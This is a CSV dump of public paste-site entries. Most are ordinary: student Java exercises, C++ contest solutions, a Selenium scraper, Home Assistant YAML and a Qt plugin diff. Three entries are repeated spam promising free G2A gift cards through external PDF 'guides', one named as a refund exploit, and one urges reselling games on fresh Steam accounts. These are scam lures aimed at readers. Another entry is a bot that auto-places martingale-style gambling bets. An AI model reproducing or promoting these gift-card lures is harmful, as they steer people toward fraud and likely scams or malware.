id,title,username,language,date,content
TQuwgZ5j,data878,TestGuy1,JSON,Sunday 24th of March 2024 07:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'bf44a35532f3edf6fcca36c43757481b9900c413a954b8bc4f2a501b98efd82c03344cf4b527a5865d8668a8aedbac7956bbee36fe688f424023b8653e4effcb01bfc00a21cba7574f7398f608a46a9e7f1e61e24e0dabb29253c159d701cc3af3dbdc47cb269dcd13f0781724bd047ede1f4e20dda74d7a80de3c84dbad8a5a',
  otherdata: [
    '2835d2f50a8beba20ad931fa7afc5141',
    '333674182309aa80f25617ba518205d5',
    'a19db4cfa1329440a3ddd4648fa4efaa',
    '894f6ff3810142abd4bc70958a069c2c',
    '44f78cd1b393a6e6d3fc2aa673becb44',
    '96e77f0afecd9dfab461f29145c0d233',
    '7d643c634fb826170f0e416470d6c73f',
    'e22ada234f8b28a84517015de4ac820c'
  ]
}"
Db0QG7Jf,Untitled,Josif_tepe,C++,Sunday 24th of March 2024 06:45:40 AM CDT,"#include <iostream>
#include <algorithm>
using namespace std;

int main() {
    int n, c, d, e;
    int tabaci, strana;
    cin >> tabaci >> strana;
    
    int S = 1;
    int E = tabaci * 4;
    
    for(int i = 0; i < tabaci; i++) {
        
        
        if(strana == S) {
            cout << S + 1 << "" "" << E - 1 << "" "" << E << endl;
        }
        else if(strana == S + 1) {
            cout << S << "" "" << E - 1 << "" "" << E << endl;
        }
        else if(strana == E - 1) {
            cout << S << "" "" << S + 1 << "" "" << E << endl;
        }
        else if(strana == E) {
            cout << S << "" "" << S + 1 << "" "" << E - 1 << endl;
        }
        S += 2;
        E -= 2;
    }
    
    
    return 0;
}
"
6dYCkXuk,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,PASUSW,GetText,Sunday 24th of March 2024 06:39:39 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
24 March 2024"
rhkQzcte,09. Ski Trip,GabrielHr00,Java,Sunday 24th of March 2024 06:30:14 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class SkiTrip {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int days = Integer.parseInt(scanner.nextLine());
        String roomType = scanner.nextLine();
        String grade = scanner.nextLine();

        int nights = days - 1;
        double finalSum = 0.0;

        if (roomType.equals(""room for one person"")) {
            finalSum = 18.0 * nights;

        } else if (roomType.equals(""apartment"")) {
            finalSum = 25.0 * nights;

            if (days < 10) {
                finalSum = finalSum * 0.70;
            } else if (days >= 10 && days <= 15) {
                finalSum = finalSum * 0.65;
            } else if (days > 15) {
                finalSum = finalSum * 0.50;
            }

        } else if (roomType.equals(""president apartment"")) {
            finalSum = 35.0 * nights;

            if (days < 10) {
                finalSum = finalSum * 0.90;
            } else if (days >= 10 && days <= 15) {
                finalSum = finalSum * 0.85;
            } else if (days > 15) {
                finalSum = finalSum * 0.80;
            }
        }

        if (grade.equals(""positive"")) {
            finalSum = finalSum * 1.25;
        } else {
            finalSum = finalSum * 0.90;
        }

        System.out.printf(""%.2f"", finalSum);
    }
}
"
02icvAqF,Numbers Convertor Extended,bAngelov,JavaScript,Sunday 24th of March 2024 06:30:08 AM CDT,"function solve() {

    const convertors = {
        ""decimal"": {
            ""binary"": number => Number(number).toString(2),
            ""hexadecimal"": number => Number(number).toString(16).toUpperCase(),
            ""octal"": number => Number(number).toString(8).toUpperCase(),
        },
        ""binary"":{
            ""decimal"": string => parseInt(string,2),
            ""hexadecimal"": string => parseInt(string,2).toString(16).toUpperCase(),
            ""octal"": string => parseInt(string,2).toString(8),
        },
        ""hexadecimal"":{
            ""decimal"": string => parseInt(string,16),
            ""binary"": string => parseInt(string,16).toString(2),
            ""octal"": string => parseInt(string,16).toString(8),
        },
        ""octal"":{
            ""decimal"": string => parseInt(string,8),
            ""binary"": string => parseInt(string,8).toString(2),
            ""hexadecimal"": string => parseInt(string,8).toString(16),
        }
    }

    const createOptions = (nameArray,selectElement)=>{
        selectElement.length = 0
        nameArray.forEach(name=>{
            const el = document.createElement(""option"")
            el.textContent = name[0].toUpperCase() + name.slice(1)
            el.value = name.toLowerCase()
            selectElement.add(el)
        })
    }

    const value = document.querySelector(""#input"")
    value.type = ""text""
    const convertToElement = document.querySelector(""#selectMenuTo"")
    const convertFromElement = document.querySelector(""#selectMenuFrom"")
    const outputElement = document.querySelector(""footer input"")
    convertToElement.remove(0)
    convertFromElement.remove(0)

    const updateFromList = () => createOptions(Object.keys(convertors),convertFromElement)
    const updateToList = () => createOptions(Object.keys(convertors[convertFromElement.value]),convertToElement)
    updateFromList()
    updateToList()

    function convert() {
        outputElement.value = convertors[convertFromElement.value][convertToElement.value](value.value)
    }

    document.querySelector(""#container button"").addEventListener(""click"", convert)
    document.querySelector(""#selectMenuFrom"").addEventListener(""change"", updateToList)

}"
ahLDXq82,08. On Time for the Exam,GabrielHr00,Java,Sunday 24th of March 2024 06:29:28 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class OnTimeForTheExam {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int examHour = Integer.parseInt(scanner.nextLine());
        int examMinutes = Integer.parseInt(scanner.nextLine());
        int arrivalHour = Integer.parseInt(scanner.nextLine());
        int arrivalMinutes = Integer.parseInt(scanner.nextLine());

        // calc exam time in minutes => (easier when working only with minutes)
        int timeForExam = (examHour * 60) + examMinutes;
        int timeForArrival = (arrivalHour * 60) + arrivalMinutes;

        // get difference between arrival time and exam time
        int diff = Math.abs(timeForArrival - timeForExam);

        // check if student is late (when timeForArrival > timeForExam)
        if(timeForArrival > timeForExam) {
            System.out.println(""Late"");

            // more than 1 hour late for the exam
            if(diff >= 60) {
                // convert back into hours/minutes
                int hour = diff / 60;
                int minutes = diff % 60;
                // %02d -> check if minutes are < 10, then insert 0 infront, if not - don't do anything
                System.out.printf(""%d:%02d hours after the start"", hour, minutes);
            } else{
                System.out.printf(""%d minutes after the start"", diff);
            }
        }
        // check for arrival on time or earlier, but not more than 30 mins
        else if(timeForExam == timeForArrival || diff <= 30) {
            System.out.println(""On Time"");

            // check for minutes before the start
            if(diff >= 1 && diff <= 30) {
                System.out.printf(""%d minutes before the start"", diff);
            }
        }
        else {
            System.out.println(""Early"");
            // more than 1 hour early for the exam
            if(diff >= 60) {
                // convert back into hours/minutes
                int hour = diff / 60;
                int minutes = diff % 60;
                // %02d -> check if minutes are < 10, then insert 0 infront, if not - don't do anything
                System.out.printf(""%d:%02d hours before the start"", hour, minutes);
            } else{
                System.out.printf(""%d minutes before the start"", diff);
            }
        }

    }
}
"
TjizkYPU,07. Hotel Room,GabrielHr00,Java,Sunday 24th of March 2024 06:28:30 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class HotelRoom {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        String month = scanner.nextLine();
        int nights = Integer.parseInt(scanner.nextLine());

        double studioPrice = 0.0;
        double apartmentPrice = 0.0;

        if (month.equals(""May"") || month.equals(""October"")) {
            studioPrice = 50.0 * nights;
            apartmentPrice = 65.0 * nights;

            if(nights > 7 && nights <= 14) {
                //studioPrice = studioPrice - (studioPrice * 0.05);
                studioPrice = studioPrice * 0.95;
            } else if (nights > 14) {
                //studioPrice = studioPrice - (studioPrice * 0.30);
                studioPrice = studioPrice * 0.70;
                apartmentPrice = apartmentPrice * 0.90;
            }
        }
        else if (month.equals(""June"") || month.equals(""September"")) {
            studioPrice = 75.20 * nights;
            apartmentPrice = 68.70 * nights;

            if (nights > 14) {
                //studioPrice = studioPrice - (studioPrice * 0.20);
                studioPrice = studioPrice * 0.80;
                apartmentPrice = apartmentPrice * 0.90;
            }
        }
        else if (month.equals(""July"") || month.equals(""August"")) {
            studioPrice = 76.0 * nights;
            apartmentPrice = 77.0 * nights;

            if(nights > 14) {
                apartmentPrice = apartmentPrice * 0.90;
            }
        }

        System.out.printf(""Apartment: %.2f lv.%nStudio: %.2f lv."", apartmentPrice, studioPrice);

    }
}"
JVNEDGWk,06. Operations Between Numbers,GabrielHr00,Java,Sunday 24th of March 2024 06:27:27 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class OperationsBetweenNumbers {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int n1 = Integer.parseInt(scanner.nextLine());
        int n2 = Integer.parseInt(scanner.nextLine());
        char operator = scanner.nextLine().charAt(0);

        if (operator == '+') {
            int result = n1 + n2;

            if (result % 2 == 0) {
                System.out.printf(""%d %c %d = %d - even"", n1, operator, n2, result);
            } else {
                System.out.printf(""%d %c %d = %d - odd"", n1, operator, n2, result);
            }

        } else if (operator == '-') {
            int result = n1 - n2;

            if (result % 2 == 0) {
                System.out.printf(""%d %c %d = %d - even"", n1, operator, n2, result);
            } else {
                System.out.printf(""%d %c %d = %d - odd"", n1, operator, n2, result);
            }
        }
        else if (operator == '*') {
            int result = n1 * n2;

            if (result % 2 == 0) {
                System.out.printf(""%d %c %d = %d - even"", n1, operator, n2, result);
            } else {
                System.out.printf(""%d %c %d = %d - odd"", n1, operator, n2, result);
            }
        }
        else if (operator == '/') {
            if (n2 == 0) {
                System.out.printf(""Cannot divide %d by zero"", n1);
            } else {
                double result = n1 / (1.0 * n2);
                System.out.printf(""%d %c %d = %.2f"", n1, operator, n2, result);
            }
        }
        else if (operator == '%') {
            if (n2 == 0) {
                System.out.printf(""Cannot divide %d by zero"", n1);
            } else {
                int result = n1 % n2;
                System.out.printf(""%d %c %d = %d"", n1, operator, n2, result);
            }
        }

    }
}
"
RFxCgqbr,05. Journey,GabrielHr00,Java,Sunday 24th of March 2024 06:26:38 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class Journey {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        double budget = Double.parseDouble(scanner.nextLine());
        String season = scanner.nextLine();

        String destination = """";
        String rest = """";
        double spentMoney = 0.0;

        if(budget <= 100) {
            destination = ""Bulgaria"";
            if(season.equals(""summer"")) {
                rest = ""Camp"";
                spentMoney = budget * 0.30;
            } else if(season.equals(""winter"")) {
                rest = ""Hotel"";
                spentMoney = budget * 0.70;
            }
        }
        else if (budget <= 1000) {
            destination = ""Balkans"";
            if(season.equals(""summer"")) {
                rest = ""Camp"";
                spentMoney = budget * 0.40;
            } else if(season.equals(""winter"")) {
                rest = ""Hotel"";
                spentMoney = budget * 0.80;
            }
        }
        else if (budget > 1000) {
            destination = ""Europe"";
            rest = ""Hotel"";
            spentMoney = budget * 0.90;
        }

        System.out.printf(""Somewhere in %s%n%s - %.2f"", destination, rest, spentMoney);
    }
}"
9J8fSKSa,04. Fishing Boat,GabrielHr00,Java,Sunday 24th of March 2024 06:25:35 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class FishingBoat {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int budget = Integer.parseInt(scanner.nextLine());
        String season = scanner.nextLine();
        int fishersCount = Integer.parseInt(scanner.nextLine());

        double boatRent = 0.0;
        switch (season) {
            case ""Spring"":
                boatRent = 3000.0;
                break;
            case ""Summer"":
            case ""Autumn"":
                boatRent = 4200.0;
                break;
            case ""Winter"":
                boatRent = 2600.0;
                break;
        }

        if (fishersCount <= 6) {
            boatRent = boatRent * 0.90;
        } else if (fishersCount >= 7 && fishersCount <= 11) {
            boatRent = boatRent * 0.85;
        } else if (fishersCount >= 12) {
            boatRent = boatRent * 0.75;
        }

        if (fishersCount % 2 == 0 && !(season.equals(""Autumn"")) ) {
            boatRent = boatRent * 0.95;
        }

        double diff = Math.abs(budget - boatRent);
        if (budget >= boatRent) {
            System.out.printf(""Yes! You have %.2f leva left."", diff);
        } else {
            System.out.printf(""Not enough money! You need %.2f leva."", diff);
        }

    }
}
"
uyr9uADg,03. New House,GabrielHr00,Java,Sunday 24th of March 2024 06:24:55 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class NewHouse {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        String flowerType = scanner.nextLine();
        int flowerCount = Integer.parseInt(scanner.nextLine());
        int budget = Integer.parseInt(scanner.nextLine());

        double finalSum = 0.0;

        switch (flowerType) {
            case ""Roses"":
                finalSum = 5.0 * flowerCount;
                if (flowerCount > 80) {
                    finalSum = finalSum * 0.90;
                    //finalSum = finalSum - (finalSum * 0.10);
                    // finalSum *= 0.90;
                }
                break;
            case ""Dahlias"":
                finalSum = 3.80 * flowerCount;
                if (flowerCount > 90) {
                    finalSum = finalSum * 0.85;
                }
                break;
            case ""Tulips"":
                finalSum = 2.8 * flowerCount;
                if (flowerCount > 80) {
                    finalSum = finalSum * 0.85;
                }
                break;
            case ""Narcissus"":
                finalSum = 3.0 * flowerCount;
                if (flowerCount < 120) {
                    finalSum = finalSum * 1.15;
                }
                break;
            case ""Gladiolus"":
                finalSum = 2.50 * flowerCount;
                if (flowerCount < 80) {
                    finalSum = finalSum * 1.20;
                }
                break;
        }


        double diff = Math.abs(budget - finalSum);
        if (budget >= finalSum) {
            System.out.printf(""Hey, you have a great garden with %d %s and %.2f leva left."",
                    flowerCount, flowerType, diff);
        } else {
            System.out.printf(""Not enough money, you need %.2f leva more."", diff);
        }

    }
}
"
EqA2Acwp,02. Summer Outfit,GabrielHr00,Java,Sunday 24th of March 2024 06:24:14 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class SummerOutfit {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int degrees = Integer.parseInt(scanner.nextLine());
        String dayTime = scanner.nextLine();

        String outfit = """";
        String shoes = """";

        if (dayTime.equals(""Morning""))
        {
            if (degrees >= 10 && degrees <= 18) {
                outfit = ""Sweatshirt"";
                shoes = ""Sneakers"";
            } else if (degrees > 18 && degrees <= 24) {
                outfit = ""Shirt"";
                shoes = ""Moccasins"";
            } else if (degrees >= 25) {
                outfit = ""T-Shirt"";
                shoes = ""Sandals"";
            }
        }
        else if (dayTime.equals(""Afternoon""))
        {
            if (degrees >= 10 && degrees <= 18) {
                outfit = ""Shirt"";
                shoes = ""Moccasins"";
            } else if (degrees > 18 && degrees <= 24) {
                outfit = ""T-Shirt"";
                shoes = ""Sandals"";
            } else if (degrees >= 25) {
                outfit = ""Swim Suit"";
                shoes = ""Barefoot"";
            }
        } else if (dayTime.equals(""Evening""))
        {
            if (degrees >= 10 && degrees <= 18) {
                outfit = ""Shirt"";
                shoes = ""Moccasins"";
            } else if (degrees > 18 && degrees <= 24) {
                outfit = ""Shirt"";
                shoes = ""Moccasins"";
            } else if (degrees >= 25) {
                outfit = ""Shirt"";
                shoes = ""Moccasins"";
            }
        }

        System.out.printf(""It's %d degrees, get your %s and %s."", degrees, outfit, shoes);

    }
}"
sp0njhzu,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,ounnuo,GetText,Sunday 24th of March 2024 06:24:12 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_550343.pdf

Working as of:
24 March 2024


















"
brUxqM0h,01. Cinema,GabrielHr00,Java,Sunday 24th of March 2024 06:23:33 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class Cinema {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        String ticketType = scanner.nextLine();
        int rows = Integer.parseInt(scanner.nextLine());
        int columns = Integer.parseInt(scanner.nextLine());

        int seatsAll = rows * columns;
        double totalPrice = 0.0;

//        if (ticketType.equals(""Premiere"")) {
//            totalPrice = 12.0 * seatsAll;
//        } else if (ticketType.equals(""Normal"")) {
//            totalPrice = 7.50 * seatsAll;
//        } else if (ticketType.equals(""Discount"")) {
//            totalPrice = 5.0 * seatsAll;
//        }

        switch (ticketType) {
            case ""Premiere"":
                totalPrice = 12.0 * seatsAll;
                break;
            case ""Normal"":
                totalPrice = 7.50 * seatsAll;
                break;
            case ""Discount"":
                totalPrice = 5.0 * seatsAll;
                break;
        }

        System.out.printf(""%.2f leva"", totalPrice);

    }
}
"
s0aB1MTv,Untitled,dereksir,C#,Sunday 24th of March 2024 06:06:41 AM CDT,"// import the required libraries
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;

public class Example
{
    static void Main(string[] args)
    {
        // set ChromeOptions to run in headless mode
        ChromeOptions options = new ChromeOptions();
        options.AddArgument(""--headless"");

        // set up ChromeDriver
        IWebDriver driver = new ChromeDriver(options);

        // navigate to the target url
        string target_url = ""https://scrapeme.live/shop/Pikachu/"";
        driver.Navigate().GoToUrl(target_url);

        // find the element containing the product price
        IWebElement priceElement = driver.FindElement(By.CssSelector(""#product-752 > div.summary.entry-summary > p.price > span""));

        // extract the text of the product price
        string productPrice = priceElement.Text;

        // print the extracted product price
        Console.WriteLine(""Product Price: "" + productPrice);

        // close the browser
        driver.Quit();
    }
}"
p0mdFDvC,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Sunday 24th of March 2024 06:03:58 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
24 March 2024















































"
N44nvbtQ,snowybot,coinwalk,JavaScript,Sunday 24th of March 2024 05:59:43 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var monkey = Number((olsenest/1000).toFixed(7));
var bolux = monkey;
var tens = (monkey*10);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var feeble = ((Math.floor(olsenest/tens))*tens);
var olsen = parseFloat(feeble);
var awesome = parseFloat(feeble);
var whare = olsenest;
var upper = 6.9;
var downer = 2.9;
var belance = olsenest;
var fart = 4;
 
 
function soiled(){
belance = document.getElementById('pct_balance').value;
feeble = ((Math.floor(belance/tens))*tens);
if (belance>(olsen+(bolux*upper))){
    bolux = bolux*2;
    upper = 4.9;
    downer = 4.9;
    fran = false;
    olsen = parseFloat(belance);
}
if ((belance<(olsen-(bolux*downer)))&&(fran)){
    bolux = bolux*2;
    upper = 4.9;
    downer = 4.9;
    fran = false;
    olsen = parseFloat(belance);
}
if ((belance<(olsen-(bolux*downer)))&&(!fran)){
    upper = 4.9;
    downer = 4.9;
    fran = true;
    olsen = parseFloat(belance);
}
if ((((belance/300)-bolux)<=0)&&(belance<(feeble+sevens))&&(belance<whare)){
    bolux = monkey;
    upper = 6.9;
    downer = 2.9;
    fart = 0;
    fran = true;
    olsen = parseFloat(feeble);
    whare =  parseFloat(belance);
}
if ((belance>(awesome*1.044))&&(belance<(feeble+sevens))){
    monkey = Number(((parseFloat(belance))/100).toFixed(7));
    tens = (monkey*10);
    sevens = (monkey*6.9);
    eights = (monkey*7.9);
    bolux = monkey;
    upper = 6.9;
    downer = 2.9;
    fart = 4;
    olsen = parseFloat(feeble);
    whare =  parseFloat(belance);
    awesome = parseFloat(feeble);
}
if (belance>=(14400)){
console.log(""winner winner chicken dinner"");
return;
}
var dog = ((belance-olsenest).toFixed(8));
console.log(""profit"");
console.log(dog);
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() =>soiled(), 1);
}
soiled();"
8hdRY8ZM,Untitled,Josif_tepe,C++,Sunday 24th of March 2024 05:54:33 AM CDT,"#include <iostream>
#include <algorithm>
using namespace std;

int main() {
    int n;
    cin >> n;
    
    int niza[n];
    for(int i = 0; i < n; i++) {
        cin >> niza[i];
    }
    sort(niza, niza + n);
    int S = 0;
    int E = n - 1;
    int res = 0;
    while(S < E) {
        while(niza[S] > 0 and S < E) {
            E--;
            niza[S]--;
            res++;
        }
        S++;
    }
    cout << res << endl;
    return 0;
}
"
rUpCsyJ5,Auto Reset Proxy,ngatmuri,PHP,Sunday 24th of March 2024 05:52:28 AM CDT,"<?php
$token ='';
$url = 'https://account.ipvanish.com/api-v4/proxy-credentials/reset';
$curl = curl_init($url);

$headers = [
    'authority: account.ipvanish.com',
    'method: POST',
    'path: /api-v4/proxy-credentials/reset',
    'scheme: https',
    'Accept: */*',
    //'Accept-Encoding: gzip, deflate, br, zstd',
    'Accept-Language: en-US,en;q=0.9,id;q=0.8',
    'Authorization: '.$token,
    'Origin: https://my.ipvanish.com',
    'Referer: https://my.ipvanish.com/',
    'Sec-Ch-Ua: ""Chromium"";v=""122"", ""Not(A:Brand"";v=""24"", ""Google Chrome"";v=""122""',
    'Sec-Ch-Ua-Mobile: ?1',
    'Sec-Ch-Ua-Platform: ""Android""',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-site',
    'User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
];

curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_POST, true);
//curl_setopt($curl, CURLOPT_POSTFIELDS,json_encode($post_data) );
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE); 



$response = curl_exec($curl); 
$json = $response;
$obj = json_decode($json);

//print_r($obj);
echo $obj->proxyUsername.':'.$obj->proxyPassword;

?>"
LS6yFKjU,Untitled,LA_,YAML,Sunday 24th of March 2024 05:43:29 AM CDT,"- id: leak_sensors_unavailable_notification
  alias: Уведомление в telegram об исчезновении связи с датчиками протечки
  description: ''
  trigger:
  - platform: time_pattern
    hours: '19'
  condition:
  - condition: and
    conditions:
    - condition: template
      value_template: '{{ now().day == 24 }}'
    - condition: or
      conditions:
      - condition: template
        value_template: '{{ states(''sensor.water_leak_toilet_sink_battery'') == ''unknown''
          }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_kitchen_dishwasher_battery'')
          == ''unknown'' }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_kitchen_sink_battery'') ==
          ''unknown'' }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_washer_battery'') == ''unknown''
          }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_bathroom_sink_battery'') ==
          ''unknown'' }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_toilet_riser_battery'') ==
          ''unknown'' }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_kitchen_riser_battery'') ==
          ''unknown'' }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_bathroom_tub_battery'') ==
          ''unknown'' }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_commutator_battery'') == ''unknown''
          }}'
      - condition: template
        value_template: '{{ states(''sensor.water_leak_bathroom_riser_battery'') ==
          ''unknown'' }}'
  action:
  - service: notify.telegram_id
    data:
      message: |
        Недоступные датчики протечки:
        {% set water_leaks = ['sensor.water_leak_toilet_sink_battery', 'sensor.water_leak_kitchen_dishwasher_battery', 'sensor.water_leak_kitchen_sink_battery', 'sensor.water_leak_washer_battery', 'sensor.water_leak_bathroom_sink_battery', 'sensor.water_leak_toilet_riser_battery', 'sensor.water_leak_kitchen_riser_battery', 'sensor.water_leak_bathroom_tub_battery', 'sensor.water_leak_commutator_battery', 'sensor.water_leak_bathroom_riser_battery'] %}
        {% for wl in water_leaks %}{% if states(wl) == 'unknown' %}{{ wl }}, {% endif %}{% endfor %}
  mode: single"
66JeJYcT,Untitled,Josif_tepe,C++,Sunday 24th of March 2024 05:18:39 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int t, strana;
    cin >> t >> strana;
    
    int s = 1, e = 4 * t;
    for(int i = 0; i < t; i++) {
        if(s == strana) {
            cout << s + 1 << "" "" << e - 1 << "" "" << e << endl;
        }
        else if(s + 1 == strana) {
            cout << s << "" "" << e - 1 << "" "" << e << endl;
        }
        else if(e - 1 == strana) {
            cout << s << "" "" << s + 1 << "" "" << e << endl;
        }
        else if(e == strana) {
            cout << s << "" "" << s + 1 << "" "" << e - 1 << endl;
        }
        
        s += 2;
        e -= 2;
    }
    
    
    return 0;
}
"
MUBLNVqb,map,LEGEND2004,C++,Sunday 24th of March 2024 04:59:41 AM CDT,"//https://cplusplus.com/reference/map/map/?kw=map
#pragma GCC optimize(""O3"")
#include <bits/stdc++.h>
using namespace std;

#define int long long
#define fastio ios_base::sync_with_stdio(0); cin.tie(0)

signed main()
{
    fastio;

    /*map<string , string> mp;
    mp[""AC""] = ""Accepted"";
    mp[""WA""] = ""Wrong Answer"";
    cout << mp[""AC""] << '\n'; //
    cout << mp.size() << '\n'; //
    cout << mp[""TLE""] << '\n';
    cout << mp.size() << '\n';
    mp[""AA""] = ""BB"";
    for(auto i : mp){
        cout << i.first << "" "" << i.second << '\n';
    }*/
    map<string , vector<string> > v;
    v[""AC""].push_back(""Accepted"");
    v[""AC""].push_back(""100%"");
    for(auto i : v[""AC""]){
        cout << i << "" "";
    }
    /*

    {""AC"" , ""Accepted""}
    {""TLE"" , """"}
    {""WA"" , ""Wrong Answer""}

    8
    1 2 2 3 4 4 3 3 105

    {1 , 1}
    {2 , 2}
    {3 , 3}
    {4 , 2}
    {105 , 1}

    */
}
"
zP5vznUU,Untitled,Josif_tepe,C++,Sunday 24th of March 2024 04:42:15 AM CDT,"class Solution
{
    public:
    //Function to return a list of integers denoting the node
    //values of both the BST in a sorted order.
    vector<int> v1, v2;
    void dfs(Node *root, int t) {
        if(!root) {
            return;
        }
        dfs(root->left, t);
        if(t == 1) {
            v1.push_back(root->data);
        }
        else {
            v2.push_back(root->data);
        }
        dfs(root->right, t);
    }
    vector<int> merge(Node *root1, Node *root2)
    {
        dfs(root1, 1);
        dfs(root2, 2);
        
        vector<int> v;
        int i = 0,  j = 0;
        while(i < (int) v1.size() and j < (int) v2.size()) {
            if(v1[i] < v2[j]) {
                v.push_back(v1[i]);
                i++;
            }
            else if(v1[i] > v2[j]) {
                v.push_back(v2[j]);
                j++;
            }
            else {
                v.push_back(v1[i]);
                v.push_back(v1[i]);
                i++;
                j++;
            }
        }
        while(i < (int) v1.size()) {
            v.push_back(v1[i]);
            i++;
        }
        while(j < (int) v2.size()) {
            v.push_back(v2[j]);
            j++;
        }
        return v;
    }
};"
WHCn3YYE,plugin change,KukuRuzo,C++,Sunday 24th of March 2024 04:38:54 AM CDT,"diff --git a/generic/videostatusplugin/videostatusplugin.cpp b/generic/videostatusplugin/videostatusplugin.cpp
index b358aa9..24091a0 100644
--- a/generic/videostatusplugin/videostatusplugin.cpp
+++ b/generic/videostatusplugin/videostatusplugin.cpp
@@ -199,6 +199,10 @@ void VideoStatusChanger::setPsiAccountControllingHost(PsiAccountControllingHost
 
 bool VideoStatusChanger::enable()
 {
+#ifdef HAVE_DBUS
+    if(!X11Info::isPlatformX11())
+        return false;
+#endif
     if (psiOptions) {
         enabled = true;
 #ifdef HAVE_DBUS
diff --git a/generic/videostatusplugin/x11info.cpp b/generic/videostatusplugin/x11info.cpp
index ed8ac1a..727878c 100644
--- a/generic/videostatusplugin/x11info.cpp
+++ b/generic/videostatusplugin/x11info.cpp
@@ -19,6 +19,11 @@
 #include ""x11info.h""
 
 #include <QtGlobal>
+#if QT_VERSION < QT_VERSION_CHECK(6, 0, 0)
+#include <QX11Info>
+#else
+#include <QGuiApplication>
+#endif
 #include <X11/Xlib.h>
 #include <xcb/xcb.h>
 
@@ -48,3 +53,13 @@ xcb_connection_t *X11Info::_xcb = nullptr;
 
 Display *X11Info::_display            = nullptr;
 int      X11Info::_xcbPreferredScreen = 0;
+
+bool X11Info::isPlatformX11()
+{
+#if QT_VERSION < QT_VERSION_CHECK(6, 0, 0)
+    return QX11Info::isPlatformX11();
+#else
+    auto x11app = qApp->nativeInterface<QNativeInterface::QX11Application>();
+    return !!x11app;
+#endif
+}
diff --git a/generic/videostatusplugin/x11info.h b/generic/videostatusplugin/x11info.h
index 650de19..e463699 100644
--- a/generic/videostatusplugin/x11info.h
+++ b/generic/videostatusplugin/x11info.h
@@ -32,6 +32,7 @@ public:
     static unsigned long     appRootWindow(int screen = -1);
     static xcb_connection_t *xcbConnection();
     static inline int        xcbPreferredScreen() { return _xcbPreferredScreen; }
+    static bool isPlatformX11();
 };
 
 #endif // X11INFO_H
"
zsVPvGZu,robloxlocked test,JohnLennonPlays,Lua,Sunday 24th of March 2024 04:37:07 AM CDT,"local instances = LoadAssets(16852495060)

local lemao = instances:Get(""MetaBreakpoint""):Clone()
lemao.Parent = script"
2t5YF7Um,Untitled,Josif_tepe,C++,Sunday 24th of March 2024 04:30:07 AM CDT,"#include <iostream>
#include <queue>
using namespace std;

struct node {
    char value;
    int freq;
    
    node * left,  * right;
    
    node(char _value, int _freq) {
        value = _value;
        freq = _freq;
        left = NULL;
        right = NULL;
    }
};
struct cmp {
    bool operator() (node * n1, node * n2) {
        return (n1->freq > n2->freq);
    }
};
void dfs(node * root, string s) {
    if(!root) {
        return;
    }
    if(root->value != '#') {
        cout << root-> value << "": "" << s << endl;
    }
